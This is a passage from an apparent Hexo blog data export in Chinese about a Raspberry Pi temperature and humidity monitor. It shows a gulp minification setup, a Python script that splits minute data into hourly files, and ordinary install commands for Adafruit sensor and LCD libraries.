gulp-uglify</div></pre></td></tr></table></figure></p>\n<p>安装 <code>gulp-minify-css</code> 模块<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">npm install gulp-minify-css</div></pre></td></tr></table></figure></p>\n<p>压缩源：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">asset/dist/js</div><div class=\"line\">asset/dist/css</div></pre></td></tr></table></figure></p>\n<p>目标：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">asset/js</div><div class=\"line\">asset/css</div></pre></td></tr></table></figure></p>\n<p>好的 我们可以开始写<code>gulpfile.js</code>文件了<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">// 获取 gulp</span></div><div class=\"line\"><span class=\"keyword\">var</span> gulp = <span class=\"built_in\">require</span>(<span class=\"string\">'gulp'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// 获取 uglify 模块（用于压缩 JS）</span></div><div class=\"line\"><span class=\"keyword\">var</span> uglify = <span class=\"built_in\">require</span>(<span class=\"string\">'gulp-uglify'</span>)</div><div class=\"line\"><span class=\"comment\">// 获取 minify-css 模块（用于压缩 CSS）</span></div><div class=\"line\"><span class=\"keyword\">var</span> minifyCSS = <span class=\"built_in\">require</span>(<span class=\"string\">'gulp-minify-css'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// 压缩 js 文件</span></div><div class=\"line\"><span class=\"comment\">// 在命令行使用 gulp script 启动此任务</span></div><div class=\"line\">gulp.task(<span class=\"string\">'script'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</div><div class=\"line\">    <span class=\"comment\">// 1. 找到文件</span></div><div class=\"line\">    gulp.src(<span class=\"string\">'asset/dist/js/*.js'</span>)</div><div class=\"line\">    <span class=\"comment\">// 2. 压缩文件</span></div><div class=\"line\">        .pipe(uglify())</div><div class=\"line\">    <span class=\"comment\">// 3. 另存压缩后的文件</span></div><div class=\"line\">        .pipe(gulp.dest(<span class=\"string\">'asset/js'</span>))</div><div class=\"line\">&#125;)</div><div class=\"line\"><span class=\"comment\">// 压缩 css 文件</span></div><div class=\"line\"><span class=\"comment\">// 在命令行使用 gulp css 启动此任务</span></div><div class=\"line\">gulp.task(<span class=\"string\">'css'</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</div><div class=\"line\">    <span class=\"comment\">// 1. 找到文件</span></div><div class=\"line\">    gulp.src(<span class=\"string\">'asset/dist/css/*.css'</span>)</div><div class=\"line\">    <span class=\"comment\">// 2. 压缩文件</span></div><div class=\"line\">        .pipe(minifyCSS())</div><div class=\"line\">    <span class=\"comment\">// 3. 另存为压缩文件</span></div><div class=\"line\">        .pipe(gulp.dest(<span class=\"string\">'asset/css'</span>))</div><div class=\"line\">&#125;)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// 在命令行使用 gulp auto 启动此任务</span></div><div class=\"line\">gulp.task(<span class=\"string\">'auto'</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</div><div class=\"line\">    <span class=\"comment\">// 监听文件修改，当文件被修改则执行 script 任务</span></div><div class=\"line\">    gulp.watch(<span class=\"string\">'js/*.js'</span>, [<span class=\"string\">'script'</span>])</div><div class=\"line\">    gulp.watch(<span class=\"string\">'css/*.css'</span>, [<span class=\"string\">'css'</span>])</div><div class=\"line\">&#125;)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// 使用 gulp.task('default') 定义默认任务</span></div><div class=\"line\"><span class=\"comment\">// 在命令行使用 gulp 启动 script 任务和 auto 任务</span></div><div class=\"line\">gulp.task(<span class=\"string\">'default'</span>, [<span class=\"string\">'script'</span>, <span class=\"string\">'css'</span> , <span class=\"string\">'auto'</span>])</div></pre></td></tr></table></figure></p>\n<p>执行gulp即可进行自动压缩及监听任务</p>\n<h1 id=\"结构优化\"><a href=\"#结构优化\" class=\"headerlink\" title=\"结构优化\"></a>结构优化</h1><p>这是原有的结构</p>\n<p>前端：Semantic UI + eCharts + JQuery Datapicker</p>\n<p>数据： json(时间)</p>\n<p>后端：Python + Apache</p>\n<p>后端的python程序负责测温度和测湿度，并生成json数据，为了保证事实性，python程序一直在读写相同的json文件，每一分钟读写一次，造成了json文件的比较大，大概有68KB，在前端是通过ajax加载的json文件，如果网速很慢的话，必然会造成很长时间的延迟。</p>\n<p>为了解决这个问题，首先第一步就是减小json文件大小。设计了一个解决方案是，以前的前端已经可以加载每小时数据和每分钟数据，不过小时和分钟的数据是通过在js中忽略加载实现的。</p>\n<p>而现在采用新的方案，在data数据目录下，分别建立两个目录。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">data/min</div><div class=\"line\">data/hour</div></pre></td></tr></table></figure>\n<p>数据： json(min) / json(hour) </p>\n<p>min的数据专门用于保存min,hour专门用于保存hour，为了解决旧数据迁移问题，首先先将内容移动到min目录下，在根目录下写了一个python小程序，执行挑选出hour数据并且迁移。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></div><div class=\"line\"><span class=\"keyword\">import</span> sys</div><div class=\"line\"><span class=\"keyword\">import</span> time</div><div class=\"line\"><span class=\"keyword\">import</span> json</div><div class=\"line\"><span class=\"keyword\">import</span> os</div><div class=\"line\"><span class=\"keyword\">import</span> string</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">jsonRead</span><span class=\"params\">(path,topath,name)</span>:</span></div><div class=\"line\">    pathfile = path + <span class=\"string\">'/'</span> + name</div><div class=\"line\">    topathfile = topath + <span class=\"string\">'/'</span> + name</div><div class=\"line\">    <span class=\"keyword\">if</span> os.path.exists(pathfile):</div><div class=\"line\">        file =open(pathfile,<span class=\"string\">\"r\"</span>)</div><div class=\"line\">        data = json.loads(file.read().decode(<span class=\"string\">'utf-8'</span>))</div><div class=\"line\">        i = <span class=\"number\">1</span></div><div class=\"line\">        jsonWrite(data[<span class=\"number\">0</span>],topathfile)</div><div class=\"line\">        <span class=\"keyword\">for</span> v <span class=\"keyword\">in</span> data:</div><div class=\"line\">            i = i + <span class=\"number\">1</span></div><div class=\"line\">            <span class=\"keyword\">if</span>(i%<span class=\"number\">60</span>==<span class=\"number\">0</span>):</div><div class=\"line\">                jsonWrite(v,topathfile)</div><div class=\"line\">        file.close()</div><div class=\"line\">    <span class=\"keyword\">else</span>:</div><div class=\"line\">        <span class=\"keyword\">print</span> <span class=\"string\">'unable to open '</span> + pathfile + <span class=\"string\">'file'</span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">jsonWrite</span><span class=\"params\">(data,pathfile)</span>:</span></div><div class=\"line\">    <span class=\"keyword\">if</span> os.path.exists(pathfile):</div><div class=\"line\">      file =open(pathfile,<span class=\"string\">\"rb+\"</span>)</div><div class=\"line\">      file.seek(<span class=\"number\">-1</span>,os.SEEK_END)</div><div class=\"line\">      file.truncate()</div><div class=\"line\">      file.write(<span class=\"string\">\",\"</span>)</div><div class=\"line\">      json.dump(data,file)</div><div class=\"line\">      file.write(<span class=\"string\">\"]\"</span>)</div><div class=\"line\">      file.close()</div><div class=\"line\">      <span class=\"keyword\">print</span> <span class=\"string\">'succes: '</span>+ pathfile</div><div class=\"line\">    <span class=\"keyword\">else</span>:</div><div class=\"line\">      file =open(pathfile,<span class=\"string\">\"w\"</span>)</div><div class=\"line\">      file.write(<span class=\"string\">\"[\"</span>)</div><div class=\"line\">      json.dump(data,file)</div><div class=\"line\">      file.write(<span class=\"string\">\"]\"</span>)</div><div class=\"line\">      file.close()</div><div class=\"line\"></div><div class=\"line\">dir = <span class=\"string\">'web/data/min'</span></div><div class=\"line\">dist = <span class=\"string\">'web/data/hour'</span></div><div class=\"line\">files = os.listdir(dir)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">for</span> root, dirs, files <span class=\"keyword\">in</span> os.walk(dir):</div><div class=\"line\">    <span class=\"keyword\">for</span> name <span class=\"keyword\">in</span> files:</div><div class=\"line\">        jsonRead(dir,dist,name)</div></pre></td></tr></table></figure>\n<p>与此同时也需要修改 前端js 与 后端python<br>具体代码在 <a href=\"https://github.com/yfgeek/rpi-TempRuntime/\" target=\"_blank\" rel=\"external\">项目地址</a>，不贴了。</p>\n<p>最后，经过优化，速度大概提升了5倍，前端获取的json文件为1KB。</p>\n<p>后续还会增加季度数据统计，等待数据量大一点的时候方便做数据统计工作。</p>\n","excerpt":"<p>树莓派这个项目已经过去了两月了，一直没有维护，直到我到了英国后发现，在英国连接北京的树莓派网速堪忧，只有100kb/s，每次想查看家里的温度情况，都要等待很长时间才能加载出来，有时候会丢包，这让我很不爽，于是我决定小小的优化一下。<br>","more":"</p>\n<h1 id=\"优化css-js\"><a href=\"#优化css-js\" class=\"headerlink\" title=\"优化css js\"></a>优化css js</h1><p>之前写的css与js一直没有压缩，这次决定用gulp压缩一下</p>\n<p>安装 <code>gulp</code><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">npm install -g gulp</div></pre></td></tr></table></figure></p>\n<p>安装 <code>gulp-uglify</code> 模块<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">npm install gulp-uglify</div></pre></td></tr></table></figure></p>\n<p>安装 <code>gulp-minify-css</code> 模块<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">npm install gulp-minify-css</div></pre></td></tr></table></figure></p>\n<p>压缩源：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">asset/dist/js</div><div class=\"line\">asset/dist/css</div></pre></td></tr></table></figure></p>\n<p>目标：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">asset/js</div><div class=\"line\">asset/css</div></pre></td></tr></table></figure></p>\n<p>好的 我们可以开始写<code>gulpfile.js</code>文件了<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">// 获取 gulp</span></div><div class=\"line\"><span class=\"keyword\">var</span> gulp = <span class=\"built_in\">require</span>(<span class=\"string\">'gulp'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// 获取 uglify 模块（用于压缩 JS）</span></div><div class=\"line\"><span class=\"keyword\">var</span> uglify = <span class=\"built_in\">require</span>(<span class=\"string\">'gulp-uglify'</span>)</div><div class=\"line\"><span class=\"comment\">// 获取 minify-css 模块（用于压缩 CSS）</span></div><div class=\"line\"><span class=\"keyword\">var</span> minifyCSS = <span class=\"built_in\">require</span>(<span class=\"string\">'gulp-minify-css'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// 压缩 js 文件</span></div><div class=\"line\"><span class=\"comment\">// 在命令行使用 gulp script 启动此任务</span></div><div class=\"line\">gulp.task(<span class=\"string\">'script'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</div><div class=\"line\">    <span class=\"comment\">// 1. 找到文件</span></div><div class=\"line\">    gulp.src(<span class=\"string\">'asset/dist/js/*.js'</span>)</div><div class=\"line\">    <span class=\"comment\">// 2. 压缩文件</span></div><div class=\"line\">        .pipe(uglify())</div><div class=\"line\">    <span class=\"comment\">// 3. 另存压缩后的文件</span></div><div class=\"line\">        .pipe(gulp.dest(<span class=\"string\">'asset/js'</span>))</div><div class=\"line\">&#125;)</div><div class=\"line\"><span class=\"comment\">// 压缩 css 文件</span></div><div class=\"line\"><span class=\"comment\">// 在命令行使用 gulp css 启动此任务</span></div><div class=\"line\">gulp.task(<span class=\"string\">'css'</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</div><div class=\"line\">    <span class=\"comment\">// 1. 找到文件</span></div><div class=\"line\">    gulp.src(<span class=\"string\">'asset/dist/css/*.css'</span>)</div><div class=\"line\">    <span class=\"comment\">// 2. 压缩文件</span></div><div class=\"line\">        .pipe(minifyCSS())</div><div class=\"line\">    <span class=\"comment\">// 3. 另存为压缩文件</span></div><div class=\"line\">        .pipe(gulp.dest(<span class=\"string\">'asset/css'</span>))</div><div class=\"line\">&#125;)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// 在命令行使用 gulp auto 启动此任务</span></div><div class=\"line\">gulp.task(<span class=\"string\">'auto'</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</div><div class=\"line\">    <span class=\"comment\">// 监听文件修改，当文件被修改则执行 script 任务</span></div><div class=\"line\">    gulp.watch(<span class=\"string\">'js/*.js'</span>, [<span class=\"string\">'script'</span>])</div><div class=\"line\">    gulp.watch(<span class=\"string\">'css/*.css'</span>, [<span class=\"string\">'css'</span>])</div><div class=\"line\">&#125;)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// 使用 gulp.task('default') 定义默认任务</span></div><div class=\"line\"><span class=\"comment\">// 在命令行使用 gulp 启动 script 任务和 auto 任务</span></div><div class=\"line\">gulp.task(<span class=\"string\">'default'</span>, [<span class=\"string\">'script'</span>, <span class=\"string\">'css'</span> , <span class=\"string\">'auto'</span>])</div></pre></td></tr></table></figure></p>\n<p>执行gulp即可进行自动压缩及监听任务</p>\n<h1 id=\"结构优化\"><a href=\"#结构优化\" class=\"headerlink\" title=\"结构优化\"></a>结构优化</h1><p>这是原有的结构</p>\n<p>前端：Semantic UI + eCharts + JQuery Datapicker</p>\n<p>数据： json(时间)</p>\n<p>后端：Python + Apache</p>\n<p>后端的python程序负责测温度和测湿度，并生成json数据，为了保证事实性，python程序一直在读写相同的json文件，每一分钟读写一次，造成了json文件的比较大，大概有68KB，在前端是通过ajax加载的json文件，如果网速很慢的话，必然会造成很长时间的延迟。</p>\n<p>为了解决这个问题，首先第一步就是减小json文件大小。设计了一个解决方案是，以前的前端已经可以加载每小时数据和每分钟数据，不过小时和分钟的数据是通过在js中忽略加载实现的。</p>\n<p>而现在采用新的方案，在data数据目录下，分别建立两个目录。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">data/min</div><div class=\"line\">data/hour</div></pre></td></tr></table></figure>\n<p>数据： json(min) / json(hour) </p>\n<p>min的数据专门用于保存min,hour专门用于保存hour，为了解决旧数据迁移问题，首先先将内容移动到min目录下，在根目录下写了一个python小程序，执行挑选出hour数据并且迁移。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></div><div class=\"line\"><span class=\"keyword\">import</span> sys</div><div class=\"line\"><span class=\"keyword\">import</span> time</div><div class=\"line\"><span class=\"keyword\">import</span> json</div><div class=\"line\"><span class=\"keyword\">import</span> os</div><div class=\"line\"><span class=\"keyword\">import</span> string</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">jsonRead</span><span class=\"params\">(path,topath,name)</span>:</span></div><div class=\"line\">    pathfile = path + <span class=\"string\">'/'</span> + name</div><div class=\"line\">    topathfile = topath + <span class=\"string\">'/'</span> + name</div><div class=\"line\">    <span class=\"keyword\">if</span> os.path.exists(pathfile):</div><div class=\"line\">        file =open(pathfile,<span class=\"string\">\"r\"</span>)</div><div class=\"line\">        data = json.loads(file.read().decode(<span class=\"string\">'utf-8'</span>))</div><div class=\"line\">        i = <span class=\"number\">1</span></div><div class=\"line\">        jsonWrite(data[<span class=\"number\">0</span>],topathfile)</div><div class=\"line\">        <span class=\"keyword\">for</span> v <span class=\"keyword\">in</span> data:</div><div class=\"line\">            i = i + <span class=\"number\">1</span></div><div class=\"line\">            <span class=\"keyword\">if</span>(i%<span class=\"number\">60</span>==<span class=\"number\">0</span>):</div><div class=\"line\">                jsonWrite(v,topathfile)</div><div class=\"line\">        file.close()</div><div class=\"line\">    <span class=\"keyword\">else</span>:</div><div class=\"line\">        <span class=\"keyword\">print</span> <span class=\"string\">'unable to open '</span> + pathfile + <span class=\"string\">'file'</span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">jsonWrite</span><span class=\"params\">(data,pathfile)</span>:</span></div><div class=\"line\">    <span class=\"keyword\">if</span> os.path.exists(pathfile):</div><div class=\"line\">      file =open(pathfile,<span class=\"string\">\"rb+\"</span>)</div><div class=\"line\">      file.seek(<span class=\"number\">-1</span>,os.SEEK_END)</div><div class=\"line\">      file.truncate()</div><div class=\"line\">      file.write(<span class=\"string\">\",\"</span>)</div><div class=\"line\">      json.dump(data,file)</div><div class=\"line\">      file.write(<span class=\"string\">\"]\"</span>)</div><div class=\"line\">      file.close()</div><div class=\"line\">      <span class=\"keyword\">print</span> <span class=\"string\">'succes: '</span>+ pathfile</div><div class=\"line\">    <span class=\"keyword\">else</span>:</div><div class=\"line\">      file =open(pathfile,<span class=\"string\">\"w\"</span>)</div><div class=\"line\">      file.write(<span class=\"string\">\"[\"</span>)</div><div class=\"line\">      json.dump(data,file)</div><div class=\"line\">      file.write(<span class=\"string\">\"]\"</span>)</div><div class=\"line\">      file.close()</div><div class=\"line\"></div><div class=\"line\">dir = <span class=\"string\">'web/data/min'</span></div><div class=\"line\">dist = <span class=\"string\">'web/data/hour'</span></div><div class=\"line\">files = os.listdir(dir)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">for</span> root, dirs, files <span class=\"keyword\">in</span> os.walk(dir):</div><div class=\"line\">    <span class=\"keyword\">for</span> name <span class=\"keyword\">in</span> files:</div><div class=\"line\">        jsonRead(dir,dist,name)</div></pre></td></tr></table></figure>\n<p>与此同时也需要修改 前端js 与 后端python<br>具体代码在 <a href=\"https://github.com/yfgeek/rpi-TempRuntime/\">项目地址</a>，不贴了。</p>\n<p>最后，经过优化，速度大概提升了5倍，前端获取的json文件为1KB。</p>\n<p>后续还会增加季度数据统计，等待数据量大一点的时候方便做数据统计工作。</p>"},{"title":"树莓派实时温度湿度监测进阶","date":"2016-08-26T14:19:14.000Z","_content":"\n这是一个树莓派实时监测的项目，需要参考上文，可在web上显示实时的温度及湿度变化情况。\n\n# 依赖\n* Adafruit_DHT\n* Adafruit_CharLCD\n* Nginx/Apache (请自行提前安装)\n\n# 安装依赖\n\n```bash\nsudo apt-get update\nsudo apt-get install build-essential python-dev python-smbus python-pip\ngit clone https://github.com/adafruit/Adafruit_Python_DHT.git\ncd Adafruit_Python_DHT\nsudo python setup.py install\nsudo pip install RPi.GPIO\ngit clone https://github.com/adafruit/Adafruit_Python_CharLCD\ncd Adafruit_Python_CharLCD\nsudo python setup.py install\n```\n# 安装\n```bash\ncd /var/www/html\ngit clone  https://github.com/yfgeek/rpi-TempRuntime.git\n```\n# 运行\n```bash\ncd /var/www/html/rpi-TempRuntime\npython LCD.py\n```\n\n# 截图\n![](/content/images/2016/08/WechatIMG10.jpeg)\n","source":"_posts/树莓派实时温度湿度监测进阶.md","raw":"---\ntitle: 树莓派实时温度湿度监测进阶\npermalink: runtimelcd\ndate: 2016-08-26 15:19:14\ntags: 'Raspberry'\n---\n\n这是一个树莓派实时监测的项目，需要参考上文，可在web上显示实时的温度及湿度变化情况。\n\n# 依赖\n* Adafruit_DHT\n* Adafruit_CharLCD\n* Nginx/Apache (请自行提前安装)\n\n# 安装依赖\n\n```bash\nsudo apt-get update\nsudo apt-get install build-essential python-dev python-smbus python-pip\ngit clone https://github.com/adafruit/Adafruit_Python_DHT.git\ncd Adafruit_Python_DHT\nsudo python setup.py install\nsudo pip install RPi.GPIO\ngit clone https://github.com/adafruit/Adafruit_Python_CharLCD\ncd Adafruit_Python_CharLCD\nsudo python setup.py install\n```\n# 安装\n```bash\ncd /var/www/html\ngit clone  https://github.com/yfgeek/rpi-TempRuntime.git\n```\n# 运行\n```bash\ncd /var/www/html/rpi-TempRuntime\npython LCD.py\n```\n\n# 截图\n![](/content/images/2016/08/WechatIMG10.jpeg)\n","slug":"runtimelcd","published":1,"updated":"2017-03-08T19:05:11.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xpa003g5es579shmk9c","content":"<p>这是一个树莓派实时监测的项目，需要参考上文，可在web上显示实时的温度及湿度变化情况。</p>\n<h1 id=\"依赖\"><a href=\"#依赖\" class=\"headerlink\" title=\"依赖\"></a>依赖</h1><ul>\n<li>Adafruit_DHT</li>\n<li>Adafruit_CharLCD</li>\n<li>Nginx/Apache (请自行提前安装)</li>\n</ul>\n<h1 id=\"安装依赖\"><a href=\"#安装依赖\" class=\"headerlink\" title=\"安装依赖\"></a>安装依赖</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get update</div><div class=\"line\">sudo apt-get install build-essential python-dev python-smbus python-pip</div><div class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/adafruit/Adafruit_Python_DHT.git</div><div class=\"line\"><span class=\"built_in\">cd</span> Adafruit_Python_DHT</div><div class=\"line\">sudo python setup.py install</div><div class=\"line\">sudo pip install RPi.GPIO</div><div class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/adafruit/Adafruit_Python_CharLCD</div><div class=\"line\"><span class=\"built_in\">cd</span> Adafruit_Python_CharLCD</div><div class=\"line\">sudo python setup.py install</div></pre></td></tr></table></figure>\n<h1 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">cd</span> /var/www/html</div><div class=\"line\">git <span class=\"built_in\">clone</span>  https://github.com/yfgeek/rpi-TempRuntime.git</div></pre></td></tr></table></figure>\n<h1 id=\"运行\"><a href=\"#运行\" class=\"headerlink\" title=\"运行\"></a>运行</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">cd</span> /var/www/html/rpi-TempRuntime</div><div class=\"line\">python LCD.py</div></pre></td></tr></table></figure>\n<h1 id=\"截图\"><a href=\"#截图\" class=\"headerlink\" title=\"截图\"></a>截图</h1><p><img src=\"/content/images/2016/08/WechatIMG10.jpeg\" alt=\"\"></p>\n","excerpt":"","more":"<p>这是一个树莓派实时监测的项目，需要参考上文，可在web上显示实时的温度及湿度变化情况。</p>\n<h1 id=\"依赖\"><a href=\"#依赖\" class=\"headerlink\" title=\"依赖\"></a>依赖</h1><ul>\n<li>Adafruit_DHT</li>\n<li>Adafruit_CharLCD</li>\n<li>Nginx/Apache (请自行提前安装)</li>\n</ul>\n<h1 id=\"安装依赖\"><a href=\"#安装依赖\" class=\"headerlink\" title=\"安装依赖\"></a>安装依赖</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get update</div><div class=\"line\">sudo apt-get install build-essential python-dev python-smbus python-pip</div><div class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/adafruit/Adafruit_Python_DHT.git</div><div class=\"line\"><span class=\"built_in\">cd</span> Adafruit_Python_DHT</div><div class=\"line\">sudo python setup.py install</div><div class=\"line\">sudo pip install RPi.GPIO</div><div class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/adafruit/Adafruit_Python_CharLCD</div><div class=\"line\"><span class=\"built_in\">cd</span> Adafruit_Python_CharLCD</div><div class=\"line\">sudo python setup.py install</div></pre></td></tr></table></figure>\n<h1 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">cd</span> /var/www/html</div><div class=\"line\">git <span class=\"built_in\">clone</span>  https://github.com/yfgeek/rpi-TempRuntime.git</div></pre></td></tr></table></figure>\n<h1 id=\"运行\"><a href=\"#运行\" class=\"headerlink\" 